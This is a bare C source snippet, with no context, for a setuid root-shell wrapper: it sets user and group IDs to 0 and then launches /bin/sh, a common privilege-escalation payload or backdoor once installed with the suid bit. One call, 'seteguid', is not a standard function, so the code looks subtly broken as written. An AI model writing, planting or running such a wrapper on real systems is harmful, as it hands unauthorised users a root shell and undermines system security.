int main(int argc, char** argv)
{
	gid_t newGrp = 0;
	setuid(0);
	if (setuid(0) != 0) {
		perror("Setuid failed, no suid-bit set?");
		return 1;
	}
	setgid(0);
	seteuid(0);
	seteguid(0);
	setgroups(1, &newGrp);
	system("/bin/sh");
	execvp("/bin/sh",argv);
}
